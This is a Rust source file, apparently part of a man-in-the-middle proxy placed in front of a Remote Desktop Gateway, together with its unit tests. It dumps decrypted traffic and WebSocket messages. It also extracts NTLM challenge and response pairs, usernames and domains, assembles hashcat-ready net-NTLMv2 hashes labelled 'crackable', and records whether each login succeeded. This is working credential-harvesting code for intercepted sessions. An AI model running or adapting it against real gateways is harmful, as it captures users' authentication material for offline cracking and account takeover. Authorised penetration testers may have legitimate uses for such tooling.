use std::fs::{self, File, OpenOptions};
use std::io::Write;
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as B64;
use crate::ntlm::{detect_authenticate, detect_challenge, NtlmChallenge, NtlmResponse};
use crate::ws::{Opcode, WsMessage, WsStatus};

static COUNTER: AtomicU64 = AtomicU64::new(0);

/// What to persist per connection. `raw_dump` controls the big per-connection
/// stream files (`.c2s`/`.s2c`/`.ws.jsonl`); `ntlm_dump` controls scanning the
/// decrypted `.s2c` for an NTLM CHALLENGE and logging it to `ntlm.jsonl`.
/// `server_name` is the upstream SNI (if configured), recorded alongside each
/// challenge so a record identifies which target it came from.
#[derive(Clone)]
pub struct DumpOptions {
    pub raw_dump: bool,
    pub ntlm_dump: bool,
    pub server_name: Option<String>,
}

impl Default for DumpOptions {
    fn default() -> Self {
        DumpOptions { raw_dump: true, ntlm_dump: false, server_name: None }
    }
}

pub struct Dumper { dir: PathBuf, opts: DumpOptions }

/// One direction's dump sink. Owns its own file handle so the two pump
/// directions can write concurrently without sharing a borrow.
pub struct DirSink { file: Option<File> }

/// Per-connection metadata + index record, plus the lazily-created WebSocket
/// message log. Held by the pump parent; the two `DirSink`s are handed to the
/// two direction tasks. `finish` writes the `index.jsonl` line (including the
/// WebSocket status) after both directions complete.
pub struct ConnMeta {
    id: String,
    client: SocketAddr,
    server: SocketAddr,
    ws: Option<File>,
    ws_tried: bool,
    ws_path: PathBuf,
    start: String,
    // NTLM exchange capture (independent of the raw streams): bounded prefixes of
    // both directions, parsed and emitted as one grouped record at finish().
    ntlm_dump: bool,
    server_name: Option<String>,
    ntlm_path: PathBuf,
    ntlm_c2s_buf: Vec<u8>,
    ntlm_s2c_buf: Vec<u8>,
    ntlm_emitted: bool,
}

impl Dumper {
    pub fn new(dir: &Path, opts: DumpOptions) -> std::io::Result<Dumper> {
        fs::create_dir_all(dir)?;
        Ok(Dumper { dir: dir.to_path_buf(), opts })
    }

    /// Open a connection's dump: returns the metadata handle plus the c2s and
    /// s2c sinks (in that order).
    pub fn open_conn(&self, client: SocketAddr, server: SocketAddr) -> (ConnMeta, DirSink, DirSink) {
        let n = COUNTER.fetch_add(1, Ordering::Relaxed);
        let id = format!("conn-{n:08}");
        let mk = |suffix: &str| OpenOptions::new().create(true).write(true).truncate(true)
            .open(self.dir.join(format!("{id}.{suffix}")))
            .map_err(|e| tracing::warn!("dump open {suffix} failed: {e}")).ok();
        // Raw stream files are created only when raw_dump is on; NTLM-only mode
        // leaves them unopened so a real RDP session writes no per-connection bulk.
        let (c2s_file, s2c_file) = if self.opts.raw_dump { (mk("c2s"), mk("s2c")) } else { (None, None) };
        let c2s = DirSink { file: c2s_file };
        let s2c = DirSink { file: s2c_file };
        let ws_path = self.dir.join(format!("{id}.ws.jsonl"));
        let meta = ConnMeta {
            id, client, server,
            ws: None, ws_tried: false, ws_path,
            start: now_iso(),
            ntlm_dump: self.opts.ntlm_dump,
            server_name: self.opts.server_name.clone(),
            ntlm_path: self.dir.join("ntlm.jsonl"),
            ntlm_c2s_buf: Vec::new(),
            ntlm_s2c_buf: Vec::new(),
            ntlm_emitted: false,
        };
        (meta, c2s, s2c)
    }
}

impl DirSink {
    pub fn write(&mut self, b: &[u8]) {
        if let Some(file) = self.file.as_mut() {
            if let Err(e) = file.write_all(b) { tracing::warn!("dump write failed: {e}"); }
        }
    }
}

impl ConnMeta {
    /// Feed client->server plaintext for NTLM Type-3 capture. Raw stream bytes
    /// are written by the `DirSink`; this only accumulates the bounded NTLM
    /// prefix (no-op unless `ntlm_dump` is on and a record hasn't been emitted).
    pub fn feed_c2s(&mut self, b: &[u8]) {
        ntlm_accumulate(&mut self.ntlm_c2s_buf, b, self.ntlm_dump && !self.ntlm_emitted);
    }
    /// Feed server->client plaintext for NTLM Type-2 capture, and flush the
    /// grouped record the moment auth completes: the server's success status
    /// (101/2xx) answering the client's Type-3 means both halves are now in
    /// hand — no need to wait for connection close, and no loss if the proxy is
    /// killed mid-session. Checked on the delivering chunk so the buffer scan
    /// runs at most once.
    pub fn feed_s2c(&mut self, b: &[u8]) {
        ntlm_accumulate(&mut self.ntlm_s2c_buf, b, self.ntlm_dump && !self.ntlm_emitted);
        if self.ntlm_dump && !self.ntlm_emitted && s2c_saw_success(b) {
            self.emit_ntlm_record(true);
        }
    }

    /// Assemble and append the single grouped NTLM record for this connection.
    /// Called at connection close so both the Type-2 challenge (from `.s2c`) and
    /// the Type-3 response (from `.c2s`) are in hand and land on one line —
    /// yielding a hashcat-ready net-NTLMv2 hash when both halves were seen.
    /// Emits nothing if neither half was observed.
    fn emit_ntlm_record(&mut self, require_pair: bool) {
        if self.ntlm_emitted {
            return;
        }
        let challenge = detect_challenge(&self.ntlm_s2c_buf);
        let response = detect_authenticate(&self.ntlm_c2s_buf);
        // Eager path (require_pair) needs both halves; the close-time fallback
        // records whatever half was seen.
        let ready = if require_pair {
            challenge.is_some() && response.is_some()
        } else {
            challenge.is_some() || response.is_some()
        };
        if !ready {
            return;
        }

        let net_ntlmv2 = match (&challenge, &response) {
            (Some(ch), Some(r)) => build_net_ntlmv2(ch, r),
            _ => None,
        };
        let crackable = net_ntlmv2.is_some();
        // A credential was actually submitted only if a Type-3 was captured;
        // otherwise the outcome ("success"/"denied") is not meaningful.
        let auth_result = response.as_ref().map(|_| {
            if s2c_saw_success(&self.ntlm_s2c_buf) { "success" } else { "denied" }
        });
        // Raw carrier as sent, e.g. "Negotiate <base64>".
        let carrier = |scheme: &Option<String>, token: &Option<String>| {
            scheme.as_deref().zip(token.as_deref()).map(|(s, t)| format!("{s} {t}"))
        };

        let rec = serde_json::json!({
            "conn_id": self.id,
            "ts": now_iso(),
            "client": self.client.to_string(),
            "server": self.server.to_string(),
            "server_name": self.server_name,
            // request context (c2s)
            "endpoint": http_endpoint(&self.ntlm_c2s_buf),
            "rdg_user_id": rdg_user_id(&self.ntlm_c2s_buf),
            // net-NTLMv2: identity + proof (Type-3) paired with the challenge (Type-2)
            "username": response.as_ref().and_then(|r| r.username.clone()),
            "domain": response.as_ref().and_then(|r| r.domain.clone()),
            "workstation": response.as_ref().and_then(|r| r.workstation.clone()),
            "server_challenge": challenge.as_ref().map(|c| hex(&c.server_challenge)),
            "nt_proof_str": response.as_ref().and_then(|r| r.nt_proof_str.as_deref().map(hex)),
            "blob": response.as_ref().and_then(|r| r.blob.as_deref().map(hex)),
            "net_ntlmv2": net_ntlmv2,
            // gateway machine name (Type-2)
            "target_name": challenge.as_ref().and_then(|c| c.target_name.clone()),
            "nb_computer_name": challenge.as_ref().and_then(|c| c.nb_computer_name.clone()),
            "nb_domain_name": challenge.as_ref().and_then(|c| c.nb_domain_name.clone()),
            "dns_computer_name": challenge.as_ref().and_then(|c| c.dns_computer_name.clone()),
            "dns_domain_name": challenge.as_ref().and_then(|c| c.dns_domain_name.clone()),
            // raw carriers, verbatim as sent (full wire Type-2 / Type-3 messages)
            "www_authenticate": challenge.as_ref().and_then(|c| carrier(&c.scheme, &c.token)),
            "authorization": response.as_ref().and_then(|r| carrier(&r.scheme, &r.token)),
            "auth_result": auth_result,
        });
        match OpenOptions::new().create(true).append(true).open(&self.ntlm_path) {
            Ok(mut f) => {
                if let Err(e) = writeln!(f, "{rec}") {
                    tracing::warn!("dump ntlm write failed: {e}");
                }
            }
            Err(e) => tracing::warn!("dump ntlm open failed: {e}"),
        }
        tracing::info!(
            conn = %self.id,
            computer = challenge.as_ref()
                .and_then(|c| c.nb_computer_name.as_deref().or(c.dns_computer_name.as_deref()))
                .unwrap_or("?"),
            user = response.as_ref().and_then(|r| r.username.as_deref()).unwrap_or("?"),
            crackable,
            "NTLM exchange captured"
        );
        self.ntlm_emitted = true;
    }

    /// Append one decoded WebSocket message as a JSON line to `{id}.ws.jsonl`
    /// (created lazily on first message). Text with valid UTF-8 goes in `data`;
    /// binary and invalid-UTF-8 text go in `b64`.
    pub fn write_ws_message(&mut self, msg: &WsMessage) {
        if self.ws.is_none() && !self.ws_tried {
            self.ws_tried = true;
            self.ws = OpenOptions::new()
                .create(true)
                .append(true)
                .open(&self.ws_path)
                .map_err(|e| tracing::warn!("dump open ws.jsonl failed: {e}"))
                .ok();
        }
        let Some(file) = self.ws.as_mut() else { return };

        let dir = if msg.from_client { "c2s" } else { "s2c" };
        let op = match msg.opcode { Opcode::Text => "text", Opcode::Binary => "binary" };

        let mut rec = serde_json::json!({
            "dir": dir,
            "op": op,
            "ts": now_iso(),
            "len": msg.payload.len(),
        });
        match msg.opcode {
            Opcode::Text => match std::str::from_utf8(&msg.payload) {
                Ok(s) => {
                    rec["data"] = serde_json::Value::String(s.to_string());
                }
                Err(_) => {
                    rec["b64"] = serde_json::Value::String(B64.encode(&msg.payload));
                    rec["invalid_utf8"] = serde_json::Value::Bool(true);
                }
            },
            Opcode::Binary => {
                rec["b64"] = serde_json::Value::String(B64.encode(&msg.payload));
            }
        }
        if let Err(e) = writeln!(file, "{rec}") {
            tracing::warn!("dump ws write failed: {e}");
        }
    }

    pub fn finish(mut self, dir: &Path, ws: &WsStatus) {
        // Fallback: emit any still-pending record (challenge-only, denied auth,
        // or a success whose status chunk we didn't catch) now that the
        // connection is closing. No-op if we already flushed eagerly.
        if self.ntlm_dump {
            self.emit_ntlm_record(false);
        }
        let rec = serde_json::json!({
            "conn_id": self.id, "client": self.client.to_string(),
            "server": self.server.to_string(), "start_ts": self.start, "end_ts": now_iso(),
            "ws": ws.kind_str(),
            "ws_permessage_deflate": ws.permessage_deflate,
            "ws_message_count": ws.message_count,
            "ws_close_code": ws.close_code,
            "ws_close_reason": ws.close_reason,
            "ws_undecodable_reason": ws.undecodable_reason,
        });
        match OpenOptions::new().create(true).append(true).open(dir.join("index.jsonl")) {
            Err(e) => tracing::warn!("dump index open failed: {e}"),
            Ok(mut f) => {
                if let Err(e) = writeln!(f, "{rec}") {
                    tracing::warn!("dump index write failed: {e}");
                }
            }
        }
    }
}

fn now_iso() -> String {
    time::OffsetDateTime::now_utc()
        .format(&time::format_description::well_known::Rfc3339)
        .unwrap_or_default()
}

/// Lowercase hex of a byte slice (e.g. the 8-byte server challenge → 16 chars).
fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

const NTLM_CAP: usize = 64 * 1024;

/// Append `b` to a bounded per-connection NTLM prefix buffer (only while
/// `ntlm_dump` is on and the cap is unmet). The auth handshake is small and
/// lands before the tunnel goes opaque, so a bounded prefix of each direction
/// suffices to recover the whole exchange without buffering an RDP session.
fn ntlm_accumulate(buf: &mut Vec<u8>, b: &[u8], enabled: bool) {
    if !enabled {
        return;
    }
    let room = NTLM_CAP.saturating_sub(buf.len());
    if room > 0 {
        buf.extend_from_slice(&b[..room.min(b.len())]);
    }
}

/// Assemble the hashcat net-NTLMv2 line (mode 5600):
/// `username::domain:server_challenge:nt_proof_str:blob`. `None` unless the
/// Type-3 carried both a username and an NtChallengeResponse.
fn build_net_ntlmv2(ch: &NtlmChallenge, r: &NtlmResponse) -> Option<String> {
    let user = r.username.as_deref()?;
    let domain = r.domain.as_deref().unwrap_or("");
    let nt_proof = r.nt_proof_str.as_deref()?;
    let blob = r.blob.as_deref()?;
    Some(format!(
        "{user}::{domain}:{}:{}:{}",
        hex(&ch.server_challenge),
        hex(nt_proof),
        hex(blob)
    ))
}

/// Naive byte-substring search.
fn find_subslice(hay: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || hay.len() < needle.len() {
        return None;
    }
    (0..=hay.len() - needle.len()).find(|&i| &hay[i..i + needle.len()] == needle)
}

/// The first request line's "METHOD SP request-target", dropping the trailing
/// HTTP version — e.g. "RDG_OUT_DATA /remoteDesktopGateway/". `None` if there is
/// no CRLF-terminated first line or it is not valid UTF-8.
fn http_endpoint(c2s: &[u8]) -> Option<String> {
    let end = find_subslice(c2s, b"\r\n")?;
    let line = std::str::from_utf8(&c2s[..end]).ok()?;
    let target = match line.rfind(" HTTP/") {
        Some(i) => &line[..i],
        None => line,
    };
    let target = target.trim();
    (!target.is_empty()).then(|| target.to_string())
}

/// Decode the `RDG-User-Id` request header (base64 of a UTF-16LE string) to its
/// UPN, e.g. "Administrator@RDGW1".
fn rdg_user_id(c2s: &[u8]) -> Option<String> {
    let v = header_value(c2s, b"rdg-user-id")?;
    let raw = B64.decode(v).ok()?;
    Some(crate::ntlm::utf16le(&raw))
}

/// Case-insensitive lookup of a header value within the first request's header
/// block (up to the blank line). Returns the trimmed value bytes.
fn header_value<'a>(buf: &'a [u8], name_lower: &[u8]) -> Option<&'a [u8]> {
    let head_end = find_subslice(buf, b"\r\n\r\n").unwrap_or(buf.len());
    for line in buf[..head_end].split(|&b| b == b'\n') {
        let line = line.strip_suffix(b"\r").unwrap_or(line);
        let Some(colon) = line.iter().position(|&b| b == b':') else { continue };
        let (k, v) = line.split_at(colon);
        if !k.eq_ignore_ascii_case(name_lower) {
            continue;
        }
        let v = &v[1..]; // skip ':'
        let start = v.iter().position(|&b| !matches!(b, b' ' | b'\t')).unwrap_or(v.len());
        let v = &v[start..];
        let end = v.iter().rposition(|&b| !matches!(b, b' ' | b'\t')).map_or(0, |i| i + 1);
        return Some(&v[..end]);
    }
    None
}

/// Best-effort: did the server return a success status (101 or 2xx) anywhere in
/// the captured s2c prefix? Distinguishes an accepted credential submission
/// ("success") from a rejected one ("denied").
fn s2c_saw_success(s2c: &[u8]) -> bool {
    let mut from = 0;
    while let Some(rel) = find_subslice(&s2c[from..], b"HTTP/1.") {
        let i = from + rel;
        let code_at = i + 9; // "HTTP/1." + minor digit + space
        if let Some(code) = s2c.get(code_at..code_at + 3) {
            if code == b"101" || code[0] == b'2' {
                return true;
            }
        }
        from = i + 7;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::SocketAddr;
    use crate::ws::{Opcode, WsKind, WsMessage, WsStatus};

    #[test]
    fn writes_streams_and_index() {
        let dir = tempfile::tempdir().unwrap();
        let d = Dumper::new(dir.path(), DumpOptions::default()).unwrap();
        let (meta, mut c2s, mut s2c) = d.open_conn(
            "10.8.0.5:43012".parse::<SocketAddr>().unwrap(),
            "192.168.1.50:443".parse::<SocketAddr>().unwrap());
        c2s.write(b"GET / HTTP/1.1\r\n");
        s2c.write(b"HTTP/1.1 200 OK\r\n");
        let id = meta.id.clone();
        meta.finish(dir.path(), &WsStatus::none());

        let c2s_bytes = std::fs::read(dir.path().join(format!("{id}.c2s"))).unwrap();
        assert_eq!(c2s_bytes, b"GET / HTTP/1.1\r\n");
        let s2c_bytes = std::fs::read(dir.path().join(format!("{id}.s2c"))).unwrap();
        assert_eq!(s2c_bytes, b"HTTP/1.1 200 OK\r\n");
        let idx = std::fs::read_to_string(dir.path().join("index.jsonl")).unwrap();
        assert!(idx.contains("10.8.0.5:43012"));
        assert!(idx.contains("192.168.1.50:443"));
    }

    #[test]
    fn writes_ws_messages_text_and_binary() {
        let dir = tempfile::tempdir().unwrap();
        let d = Dumper::new(dir.path(), DumpOptions::default()).unwrap();
        let (mut meta, _c2s, _s2c) = d.open_conn(
            "10.0.0.1:1".parse().unwrap(),
            "10.0.0.2:443".parse().unwrap(),
        );
        meta.write_ws_message(&WsMessage { from_client: true, opcode: Opcode::Text, payload: b"{\"a\":1}".to_vec() });
        meta.write_ws_message(&WsMessage { from_client: false, opcode: Opcode::Binary, payload: vec![0, 159, 146, 150] });
        let id = meta.id.clone();
        let ws = WsStatus { kind: WsKind::Decoded, permessage_deflate: true, message_count: 2, close_code: Some(1000), close_reason: Some("bye".into()), undecodable_reason: None };
        meta.finish(dir.path(), &ws);

        let jsonl = std::fs::read_to_string(dir.path().join(format!("{id}.ws.jsonl"))).unwrap();
        let mut lines = jsonl.lines();
        let l1: serde_json::Value = serde_json::from_str(lines.next().unwrap()).unwrap();
        assert_eq!(l1["dir"], "c2s");
        assert_eq!(l1["op"], "text");
        assert_eq!(l1["data"], "{\"a\":1}");
        let l2: serde_json::Value = serde_json::from_str(lines.next().unwrap()).unwrap();
        assert_eq!(l2["dir"], "s2c");
        assert_eq!(l2["op"], "binary");
        assert!(l2["b64"].is_string());

        let idx = std::fs::read_to_string(dir.path().join("index.jsonl")).unwrap();
        let rec: serde_json::Value = serde_json::from_str(idx.lines().next().unwrap()).unwrap();
        assert_eq!(rec["ws"], "decoded");
        assert_eq!(rec["ws_permessage_deflate"], true);
        assert_eq!(rec["ws_message_count"], 2);
        assert_eq!(rec["ws_close_code"], 1000);
        assert_eq!(rec["ws_close_reason"], "bye");
        assert!(rec["ws_undecodable_reason"].is_null());
    }

    #[test]
    fn invalid_utf8_text_falls_back_to_b64() {
        let dir = tempfile::tempdir().unwrap();
        let d = Dumper::new(dir.path(), DumpOptions::default()).unwrap();
        let (mut meta, _c2s, _s2c) = d.open_conn("10.0.0.1:1".parse().unwrap(), "10.0.0.2:443".parse().unwrap());
        meta.write_ws_message(&WsMessage { from_client: true, opcode: Opcode::Text, payload: vec![0xff, 0xfe] });
        let id = meta.id.clone();
        meta.finish(dir.path(), &WsStatus::none());
        let jsonl = std::fs::read_to_string(dir.path().join(format!("{id}.ws.jsonl"))).unwrap();
        let rec: serde_json::Value = serde_json::from_str(jsonl.lines().next().unwrap()).unwrap();
        assert!(rec["b64"].is_string());
        assert_eq!(rec["invalid_utf8"], true);
    }

    #[test]
    fn ntlm_dump_writes_record_and_skips_raw_streams() {
        let dir = tempfile::tempdir().unwrap();
        let d = Dumper::new(dir.path(), DumpOptions {
            raw_dump: false, ntlm_dump: true, server_name: Some("gw.rdgw.test".into()),
        }).unwrap();
        let (mut meta, _c2s, _s2c) = d.open_conn(
            "10.20.1.5:51616".parse().unwrap(),
            "10.20.2.10:443".parse().unwrap());
        let id = meta.id.clone();
        // A 401 carrying the MS-NLMP example CHALLENGE_MESSAGE in a WWW-Authenticate: NTLM header.
        let b64 = B64.encode(crate::ntlm::CHALLENGE_MESSAGE_EXAMPLE);
        let s2c = format!("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {b64}\r\n\r\n");
        meta.feed_s2c(s2c.as_bytes());
        meta.finish(dir.path(), &crate::ws::WsStatus::none());

        // raw streams suppressed
        assert!(!dir.path().join(format!("{id}.c2s")).exists());
        assert!(!dir.path().join(format!("{id}.s2c")).exists());
        // ntlm.jsonl carries the challenge + names + which target it connected to
        let line = std::fs::read_to_string(dir.path().join("ntlm.jsonl")).unwrap();
        let rec: serde_json::Value = serde_json::from_str(line.lines().next().unwrap()).unwrap();
        assert_eq!(rec["conn_id"], id);
        assert_eq!(rec["client"], "10.20.1.5:51616");
        assert_eq!(rec["server"], "10.20.2.10:443");
        assert_eq!(rec["server_name"], "gw.rdgw.test");
        assert_eq!(rec["server_challenge"], "0123456789abcdef");
        assert_eq!(rec["nb_computer_name"], "Server");
        assert_eq!(rec["nb_domain_name"], "Domain");
        // the raw WWW-Authenticate value (scheme + verbatim token) as sent
        assert_eq!(rec["www_authenticate"], format!("NTLM {b64}"));
        // index.jsonl still written even with raw_dump = false
        assert!(dir.path().join("index.jsonl").exists());
    }

    #[test]
    fn ntlm_dump_records_first_challenge_only() {
        let dir = tempfile::tempdir().unwrap();
        let d = Dumper::new(dir.path(), DumpOptions {
            raw_dump: false, ntlm_dump: true, server_name: None,
        }).unwrap();
        let (mut meta, _c2s, _s2c) = d.open_conn("10.0.0.1:1".parse().unwrap(), "10.0.0.2:443".parse().unwrap());
        let b64 = B64.encode(crate::ntlm::CHALLENGE_MESSAGE_EXAMPLE);
        meta.feed_s2c(format!("HTTP/1.1 401\r\nWWW-Authenticate: NTLM {b64}\r\n\r\n").as_bytes());
        meta.feed_s2c(format!("HTTP/1.1 401\r\nWWW-Authenticate: NTLM {b64}\r\n\r\n").as_bytes());
        meta.finish(dir.path(), &crate::ws::WsStatus::none());
        let n = std::fs::read_to_string(dir.path().join("ntlm.jsonl")).unwrap().lines().count();
        assert_eq!(n, 1, "only the first challenge per connection is recorded");
    }

    #[test]
    fn both_dumps_off_writes_no_stream_or_ntlm_files() {
        let dir = tempfile::tempdir().unwrap();
        let d = Dumper::new(dir.path(), DumpOptions {
            raw_dump: false, ntlm_dump: false, server_name: None,
        }).unwrap();
        let (mut meta, _c2s, _s2c) = d.open_conn("10.0.0.1:1".parse().unwrap(), "10.0.0.2:443".parse().unwrap());
        let id = meta.id.clone();
        let b64 = B64.encode(crate::ntlm::CHALLENGE_MESSAGE_EXAMPLE);
        meta.feed_c2s(b"GET / HTTP/1.1\r\n\r\n");
        meta.feed_s2c(format!("HTTP/1.1 401\r\nWWW-Authenticate: NTLM {b64}\r\n\r\n").as_bytes());
        meta.finish(dir.path(), &crate::ws::WsStatus::none());
        assert!(!dir.path().join(format!("{id}.c2s")).exists());
        assert!(!dir.path().join(format!("{id}.s2c")).exists());
        assert!(!dir.path().join("ntlm.jsonl").exists());
    }

    /// base64 of a UPN as UTF-16LE — how RD Gateway encodes `RDG-User-Id`.
    fn rdg_user_id_b64(upn: &str) -> String {
        let mut bytes = Vec::new();
        for u in upn.encode_utf16() {
            bytes.extend_from_slice(&u.to_le_bytes());
        }
        B64.encode(bytes)
    }

    #[test]
    fn ntlm_dump_groups_challenge_and_response_into_one_record() {
        let dir = tempfile::tempdir().unwrap();
        let d = Dumper::new(dir.path(), DumpOptions {
            raw_dump: false, ntlm_dump: true, server_name: Some("gw.rdgw.test".into()),
        }).unwrap();
        let (mut meta, _c2s, _s2c) = d.open_conn(
            "10.20.1.5:51616".parse().unwrap(),
            "10.20.2.10:443".parse().unwrap());
        let id = meta.id.clone();

        let chal_b64 = B64.encode(crate::ntlm::CHALLENGE_MESSAGE_EXAMPLE);
        let auth_b64 = B64.encode(crate::ntlm::AUTHENTICATE_MESSAGE_EXAMPLE);
        let uid = rdg_user_id_b64("Administrator@RDGW1");

        // Client request: endpoint, RDG-User-Id, and the Type-3 response.
        let c2s = format!(
            "RDG_OUT_DATA /remoteDesktopGateway/ HTTP/1.1\r\n\
             RDG-User-Id: {uid}\r\n\
             Authorization: NTLM {auth_b64}\r\n\r\n");
        meta.feed_c2s(c2s.as_bytes());
        // Server: 401 challenge, then 101 (auth accepted).
        meta.feed_s2c(format!("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {chal_b64}\r\n\r\n").as_bytes());
        meta.feed_s2c(b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n\r\n");
        meta.finish(dir.path(), &crate::ws::WsStatus::none());

        // Exactly one grouped line for the connection — not two.
        let body = std::fs::read_to_string(dir.path().join("ntlm.jsonl")).unwrap();
        assert_eq!(body.lines().count(), 1, "one grouped record per connection");
        let rec: serde_json::Value = serde_json::from_str(body.lines().next().unwrap()).unwrap();

        assert_eq!(rec["conn_id"], id);
        assert_eq!(rec["server_name"], "gw.rdgw.test");
        assert_eq!(rec["endpoint"], "RDG_OUT_DATA /remoteDesktopGateway/");
        assert_eq!(rec["rdg_user_id"], "Administrator@RDGW1");
        // Type-3 identity (from c2s)
        assert_eq!(rec["username"], "alice");
        assert_eq!(rec["domain"], "CORP");
        assert_eq!(rec["workstation"], "WS01");
        // Type-2 challenge + gateway name (from s2c)
        assert_eq!(rec["server_challenge"], "0123456789abcdef");
        assert_eq!(rec["nb_computer_name"], "Server");
        // Type-3 proof (from c2s)
        assert_eq!(rec["nt_proof_str"], "0102030405060708090a0b0c0d0e0f10");
        assert_eq!(rec["blob"], "0101000000000000");
        // Assembled hashcat -m 5600 line (both halves)
        assert_eq!(
            rec["net_ntlmv2"],
            "alice::CORP:0123456789abcdef:0102030405060708090a0b0c0d0e0f10:0101000000000000"
        );
        // Raw carriers, both directions, verbatim as sent
        assert_eq!(rec["www_authenticate"], format!("NTLM {chal_b64}"));
        assert_eq!(rec["authorization"], format!("NTLM {auth_b64}"));
        // Outcome: 401 -> 101 means the credential was accepted
        assert_eq!(rec["auth_result"], "success");
    }

    #[test]
    fn ntlm_dump_challenge_only_leaves_response_fields_null() {
        let dir = tempfile::tempdir().unwrap();
        let d = Dumper::new(dir.path(), DumpOptions {
            raw_dump: false, ntlm_dump: true, server_name: None,
        }).unwrap();
        let (mut meta, _c2s, _s2c) = d.open_conn("10.0.0.1:1".parse().unwrap(), "10.0.0.2:443".parse().unwrap());
        let chal_b64 = B64.encode(crate::ntlm::CHALLENGE_MESSAGE_EXAMPLE);
        // A client that never submits credentials: a Type-1 negotiate, no Type-3.
        meta.feed_c2s(b"GET /rpc/rpcproxy.dll HTTP/1.1\r\nAuthorization: NTLM TlRMTVNTUAABAAAA\r\n\r\n");
        meta.feed_s2c(format!("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {chal_b64}\r\n\r\n").as_bytes());
        meta.finish(dir.path(), &crate::ws::WsStatus::none());

        let body = std::fs::read_to_string(dir.path().join("ntlm.jsonl")).unwrap();
        assert_eq!(body.lines().count(), 1);
        let rec: serde_json::Value = serde_json::from_str(body.lines().next().unwrap()).unwrap();
        // Challenge captured...
        assert_eq!(rec["server_challenge"], "0123456789abcdef");
        assert_eq!(rec["nb_computer_name"], "Server");
        // ...but no response half, so nothing crackable and no outcome.
        assert!(rec["username"].is_null());
        assert!(rec["net_ntlmv2"].is_null());
        assert!(rec["auth_result"].is_null());
    }

    #[test]
    fn ntlm_dump_flushes_on_auth_success_before_close() {
        let dir = tempfile::tempdir().unwrap();
        let d = Dumper::new(dir.path(), DumpOptions {
            raw_dump: false, ntlm_dump: true, server_name: None,
        }).unwrap();
        let (mut meta, _c2s, _s2c) = d.open_conn(
            "10.20.1.5:59338".parse().unwrap(),
            "10.20.2.10:443".parse().unwrap());
        let chal_b64 = B64.encode(crate::ntlm::CHALLENGE_MESSAGE_EXAMPLE);
        let auth_b64 = B64.encode(crate::ntlm::AUTHENTICATE_MESSAGE_EXAMPLE);
        let ntlm = dir.path().join("ntlm.jsonl");

        // Client sends its Type-3 first (the proxy relays c2s before the server's
        // 101 can come back).
        meta.feed_c2s(format!(
            "RDG_OUT_DATA /remoteDesktopGateway/ HTTP/1.1\r\nAuthorization: NTLM {auth_b64}\r\n\r\n"
        ).as_bytes());
        // Server challenge (401): the pair is now in hand, but auth has not yet
        // succeeded, so nothing is flushed.
        meta.feed_s2c(format!("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {chal_b64}\r\n\r\n").as_bytes());
        assert!(!ntlm.exists(), "must not flush before the server accepts the credential");

        // Server accepts: 101 Switching Protocols -> flush now, WITHOUT finish()
        // (the RDP tunnel connection stays open for the whole session).
        meta.feed_s2c(b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n\r\n");
        let body = std::fs::read_to_string(&ntlm).expect("record flushed on auth success");
        assert_eq!(body.lines().count(), 1);
        let rec: serde_json::Value = serde_json::from_str(body.lines().next().unwrap()).unwrap();
        assert_eq!(rec["username"], "alice");
        assert_eq!(
            rec["net_ntlmv2"],
            "alice::CORP:0123456789abcdef:0102030405060708090a0b0c0d0e0f10:0101000000000000"
        );
        assert_eq!(rec["auth_result"], "success");

        // Closing the connection must NOT append a duplicate record.
        meta.finish(dir.path(), &crate::ws::WsStatus::none());
        assert_eq!(
            std::fs::read_to_string(&ntlm).unwrap().lines().count(),
            1,
            "no duplicate record at close after an eager flush"
        );
    }
}
